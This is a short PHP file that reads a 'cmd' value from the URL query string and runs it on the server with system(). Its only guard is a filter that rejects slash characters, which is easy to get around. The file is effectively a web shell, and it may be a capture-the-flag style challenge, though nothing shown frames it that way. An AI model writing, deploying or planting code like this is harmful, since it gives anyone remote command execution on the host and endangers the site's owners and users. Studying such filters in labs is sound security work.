<?php
$cmd = $_GET['cmd'] ?? '';
if (preg_match('/\//', $cmd)) {
    die('blocked');
}
system($cmd);
?>
